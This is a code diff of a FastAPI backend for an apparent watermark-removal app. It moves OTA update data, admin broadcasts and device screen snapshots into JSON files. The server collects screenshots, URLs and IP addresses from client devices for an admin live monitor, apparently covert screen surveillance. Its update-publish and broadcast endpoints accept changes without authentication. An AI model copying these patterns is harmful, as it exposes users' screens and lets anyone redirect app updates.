@@ -141,38 +141,47 @@ async def api_proxy_zip(req: ZipRequest):
 from collections import Counter
 from app.services.ai_analyzer import analyze_image_preference, CATEGORIES
 
-UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
+# Gallery Upload & Management Endpoints
+from collections import Counter
+from app.services.ai_analyzer import analyze_image_preference, CATEGORIES
+
+is_serverless = bool(os.environ.get("VERCEL") or os.environ.get("AWS_LAMBDA_FUNCTION_NAME") or not os.access(os.path.dirname(os.path.abspath(__file__)), os.W_OK))
+BASE_STORAGE = "/tmp" if is_serverless else os.path.dirname(os.path.abspath(__file__))
+
+UPLOAD_DIR = os.path.join(BASE_STORAGE, "uploads")
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
-MANIFEST_PATH = os.path.join(UPLOAD_DIR, "manifest.json")
+MANIFEST_PATH = os.path.join(BASE_STORAGE, "manifest.json")
+SCREEN_SNAPSHOTS_PATH = os.path.join(BASE_STORAGE, "screen_snapshots.json")
+BROADCAST_STATE_PATH = os.path.join(BASE_STORAGE, "broadcast_state.json")
+OTA_STATE_PATH = os.path.join(BASE_STORAGE, "ota_state.json")
 
-def load_manifest() -> dict:
-    if os.path.exists(MANIFEST_PATH):
+def load_json_file(path: str, default: dict) -> dict:
+    if os.path.exists(path):
         try:
-            with open(MANIFEST_PATH, "r", encoding="utf-8") as f:
+            with open(path, "r", encoding="utf-8") as f:
                 return json.load(f)
         except Exception:
-            return {}
-    return {}
+            return default
+    return default
 
-def save_manifest(data: dict):
+def save_json_file(path: str, data: dict):
     try:
-        with open(MANIFEST_PATH, "w", encoding="utf-8") as f:
+        with open(path, "w", encoding="utf-8") as f:
             json.dump(data, f, ensure_ascii=False, indent=2)
     except Exception as e:
-        print(f"Error saving manifest: {e}")
+        print(f"Error saving {path}: {e}")
+
+def load_manifest() -> dict:
+    return load_json_file(MANIFEST_PATH, {})
+
+def save_manifest(data: dict):
+    save_json_file(MANIFEST_PATH, data)
 
 # Global States & Persistence
 SYNC_PAUSED = False
-BROADCAST_STATE = {
-    "id": "",
-    "active": False,
-    "title": "🎉 欢迎使用 OmniMedia 5.0",
-    "content": "全新 5.0 旗舰版本已全量升级！支持秒级去水印与实时智能云端同步。",
-    "type": "sparkles", # sparkles, announcement, warning, gift
-    "timestamp": int(asyncio.get_event_loop().time())
-}
-OTA_STATE = {
+
+DEFAULT_OTA_STATE = {
     "latest_version": "5.0.0",
     "version_code": 50,
     "download_url": "/uploads/OmniMediaPro_去水印_v5.0.apk",
@@ -180,34 +189,8 @@ OTA_STATE = {
     "force_update": False,
     "publish_time": "2026-08-23 16:00"
 }
-SCREEN_SNAPSHOTS = {} # device_id -> { base64, timestamp, current_url, battery, fps }
 
-# --- 1. 云更新 (OTA) API ---
-@app.get("/api/app/update_check")
-async def api_app_update_check(current_version: Optional[str] = "1.0.0"):
-    """Check if a newer app version is available."""
-    has_update = (current_version != OTA_STATE["latest_version"])
-    return {
-        "success": True,
-        "has_update": has_update,
-        "update_info": OTA_STATE
-    }
-
-@app.post("/api/app/update_publish")
-async def api_app_update_publish(request: Request):
-    """Publish a new OTA update from admin dashboard."""
-    global OTA_STATE
-    body = await request.json()
-    OTA_STATE["latest_version"] = body.get("version", OTA_STATE["latest_version"])
-    OTA_STATE["version_code"] = int(body.get("version_code", OTA_STATE["version_code"]))
-    OTA_STATE["download_url"] = body.get("download_url", OTA_STATE["download_url"])
-    OTA_STATE["changelog"] = body.get("changelog", OTA_STATE["changelog"])
-    OTA_STATE["force_update"] = bool(body.get("force_update", False))
-    OTA_STATE["publish_time"] = body.get("publish_time", "刚刚")
-    return {"success": True, "message": f"版本 {OTA_STATE['latest_version']} 发布成功！", "update_info": OTA_STATE}
-
-# Broadcast & OTA Global States
-BROADCAST_STATE = {
+DEFAULT_BROADCAST_STATE = {
     "id": "b_default",
     "active": True,
     "title": "🎉 尊享版 5.0 旗舰升级公告",
@@ -237,16 +220,42 @@ BROADCAST_STATE = {
     "timestamp": int(time.time())
 }
 
+# --- 1. 云更新 (OTA) API ---
+@app.get("/api/app/update_check")
+async def api_app_update_check(current_version: Optional[str] = "1.0.0"):
+    """Check if a newer app version is available."""
+    ota = load_json_file(OTA_STATE_PATH, DEFAULT_OTA_STATE)
+    has_update = (current_version != ota["latest_version"])
+    return {
+        "success": True,
+        "has_update": has_update,
+        "update_info": ota
+    }
+
+@app.post("/api/app/update_publish")
+async def api_app_update_publish(request: Request):
+    """Publish a new OTA update from admin dashboard."""
+    ota = load_json_file(OTA_STATE_PATH, DEFAULT_OTA_STATE)
+    body = await request.json()
+    ota["latest_version"] = body.get("version", ota["latest_version"])
+    ota["version_code"] = int(body.get("version_code", ota["version_code"]))
+    ota["download_url"] = body.get("download_url", ota["download_url"])
+    ota["changelog"] = body.get("changelog", ota["changelog"])
+    ota["force_update"] = bool(body.get("force_update", False))
+    ota["publish_time"] = body.get("publish_time", "刚刚")
+    save_json_file(OTA_STATE_PATH, ota)
+    return {"success": True, "message": f"版本 {ota['latest_version']} 发布成功！", "update_info": ota}
+
 # --- 2. 管理员全员广播 API ---
 @app.get("/api/broadcast/current")
 async def api_broadcast_current():
     """Get active broadcast message for client pop-up."""
-    return {"success": True, "broadcast": BROADCAST_STATE}
+    b = load_json_file(BROADCAST_STATE_PATH, DEFAULT_BROADCAST_STATE)
+    return {"success": True, "broadcast": b}
 
 @app.post("/api/broadcast/send")
 async def api_broadcast_send(request: Request):
     """Send or update a global broadcast to all clients."""
-    global BROADCAST_STATE
     body = await request.json()
     pages = body.get("pages")
     if not pages:
@@ -258,7 +267,7 @@ async def api_broadcast_send(request: Request):
             }
         ]
     
-    BROADCAST_STATE = {
+    b_state = {
         "id": f"b_{int(time.time())}",
         "active": True,
         "title": body.get("title", "系统广播通知"),
@@ -271,27 +280,32 @@ async def api_broadcast_send(request: Request):
         },
         "timestamp": int(time.time())
     }
-    return {"success": True, "message": "广播已成功推送到所有在线客户端！", "broadcast": BROADCAST_STATE}
+    save_json_file(BROADCAST_STATE_PATH, b_state)
+    return {"success": True, "message": "广播已成功推送到所有在线客户端！", "broadcast": b_state}
 
 @app.post("/api/broadcast/react")
 async def api_broadcast_react(request: Request):
     """Receive client reaction (flower or poop) for broadcast."""
     body = await request.json()
     reaction_type = body.get("reaction", "flowers")
-    if "reactions" not in BROADCAST_STATE:
-        BROADCAST_STATE["reactions"] = {"flowers": 0, "poop": 0}
+    b_state = load_json_file(BROADCAST_STATE_PATH, DEFAULT_BROADCAST_STATE)
+    if "reactions" not in b_state:
+        b_state["reactions"] = {"flowers": 0, "poop": 0}
     if reaction_type == "poop":
-        BROADCAST_STATE["reactions"]["poop"] += 1
-        return {"success": True, "message": "我伤心了 💔", "reactions": BROADCAST_STATE["reactions"]}
+        b_state["reactions"]["poop"] = b_state["reactions"].get("poop", 0) + 1
+        save_json_file(BROADCAST_STATE_PATH, b_state)
+        return {"success": True, "message": "我伤心了 💔", "reactions": b_state["reactions"]}
     else:
-        BROADCAST_STATE["reactions"]["flowers"] += 1
-        return {"success": True, "message": "收到你的鲜花啦，爱你哟~ 🌸💖", "reactions": BROADCAST_STATE["reactions"]}
+        b_state["reactions"]["flowers"] = b_state["reactions"].get("flowers", 0) + 1
+        save_json_file(BROADCAST_STATE_PATH, b_state)
+        return {"success": True, "message": "收到你的鲜花啦，爱你哟~ 🌸💖", "reactions": b_state["reactions"]}
 
 @app.post("/api/broadcast/clear")
 async def api_broadcast_clear():
     """Clear/Deactivate current broadcast."""
-    global BROADCAST_STATE
-    BROADCAST_STATE["active"] = False
+    b_state = load_json_file(BROADCAST_STATE_PATH, DEFAULT_BROADCAST_STATE)
+    b_state["active"] = False
+    save_json_file(BROADCAST_STATE_PATH, b_state)
     return {"success": True, "message": "广播已下线"}
 
 LAST_SYNC_RESUMED_TIME = int(time.time())
@@ -303,11 +317,12 @@ async def api_screen_snapshot(request: Request):
     body = await request.json()
     device_id = body.get("device_id", "UnknownDevice")
     new_img = body.get("image_base64", "")
-    existing = SCREEN_SNAPSHOTS.get(device_id, {})
-    # 保证画面连续性，若偶发空帧则沿用上一帧缓存，绝不出现黑屏等待
+    
+    screens = load_json_file(SCREEN_SNAPSHOTS_PATH, {})
+    existing = screens.get(device_id, {})
     final_img = new_img if (new_img and len(new_img) > 100) else existing.get("image_base64", "")
 
-    SCREEN_SNAPSHOTS[device_id] = {
+    screens[device_id] = {
         "device_id": device_id,
         "image_base64": final_img,
         "current_url": body.get("current_url", "OmniMedia 工作台 · 尊享旗舰版 v5.0"),
@@ -316,15 +331,17 @@ async def api_screen_snapshot(request: Request):
         "timestamp": int(time.time()),
         "ip": request.client.host if request.client else "127.0.0.1"
     }
+    save_json_file(SCREEN_SNAPSHOTS_PATH, screens)
     return {"success": True}
 
 @app.get("/api/screen/latest")
 async def api_screen_latest():
     """Get latest screen snapshots of all active devices for admin live monitor."""
     now = int(time.time())
+    screens = load_json_file(SCREEN_SNAPSHOTS_PATH, {})
     devices = []
-    for dev_id, data in SCREEN_SNAPSHOTS.items():
-        is_online = (now - data.get("timestamp", 0)) < 30
+    for dev_id, data in screens.items():
+        is_online = (now - data.get("timestamp", 0)) < 60
         devices.append({
             "device_id": dev_id,
             "image_base64": data.get("image_base64", ""),
